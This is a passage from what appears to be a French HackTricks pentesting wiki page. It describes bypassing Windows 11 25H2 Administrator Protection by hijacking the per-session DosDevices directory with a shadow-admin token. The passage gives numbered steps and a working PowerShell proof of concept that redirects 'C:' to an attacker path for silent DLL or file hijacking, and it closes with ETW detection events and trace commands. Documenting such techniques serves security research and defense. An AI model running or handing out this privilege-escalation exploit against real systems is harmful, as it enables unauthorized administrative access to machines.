> En août 2026, Microsoft documente toujours Administrator Protection comme une **version Insider en aperçu** : le déploiement d’octobre 2025 a été annulé et est prévu pour une date ultérieure. Vérifiez que **Admin Approval Mode with Administrator protection** est effectivement activé et que l’appareil a été redémarré avant de tester ces chaînes ; une simple chaîne de version 25H2 standard ne prouve pas que la fonctionnalité est active.<sup>[[10]](#references)</sup>

Pour connaître toute la surface d’attaque de `RAiLaunchAdminProcess` / UIAccess sur les versions preview de Windows 11 25H2, consultez la page dédiée :

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 « Administrator Protection » utilise des tokens shadow-admin avec des tables `\Sessions\0\DosDevices/<LUID>` par session. Le répertoire est créé de manière différée par `SeGetTokenDeviceMap` lors de la première résolution de `\??`. Si l’attaquant usurpe le token shadow-admin uniquement au niveau **SecurityIdentification**, le répertoire est créé avec l’attaquant comme **propriétaire** (hérite de `CREATOR OWNER`), ce qui permet aux liens de lettres de lecteur de prendre la priorité sur `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Étapes :**

1. Depuis une session disposant de faibles privilèges, appelez `RAiProcessRunOnce` pour lancer un `runonce.exe` shadow-admin sans invite.
2. Dupliquez son token primaire en un token d’**identification** et usurpez-le tout en ouvrant `\??` afin de forcer la création de `\Sessions\0\DosDevices/<LUID>` sous le contrôle de l’attaquant.
3. Créez un lien symbolique `C:` pointant vers un espace de stockage contrôlé par l’attaquant ; les accès ultérieurs au système de fichiers dans cette session résoudront `C:` vers le chemin de l’attaquant, permettant le détournement de DLL/fichiers sans invite.

**PoC PowerShell (NtObjectManager) :**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
Sur les hôtes en préversion, Administrator Protection enregistre les approbations et les échecs sous forme d’événements ETW **15031** et **15032** dans le provider `Microsoft-Windows-LUA`. Les événements incluent le SID du demandeur, le chemin de l’application, le résultat, le compte administrateur géré et la méthode d’authentification ; les tentatives d’exploitation répétées ou le pilotage échoué de l’interface utilisateur ne sont donc pas dépourvus de télémétrie.<sup>[[10]](#references)</sup>
```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```
## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Fonctionnement de User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Collection de techniques de UAC bypass](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Scanner de compatibilité et lanceur de UAC bypass](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI adopte l’IA pour générer des backdoors PowerShell](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Opération TrueChaos : exploitation 0-Day contre des cibles gouvernementales d’Asie du Sud-Est](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Contourner la protection des administrateurs Windows](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Contourner UAC à l’aide de la tâche SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – Bypasses de UnifiedConsent, TabTip et Narrator avec notification permanente](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Protection de l’administrateur](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – Appeler des serveurs RPC Windows locaux depuis .NET](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte améliore CoolClient avec un rootkit signé pour le kernel Windows](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
{{#include ../../banners/hacktricks-training.md}}
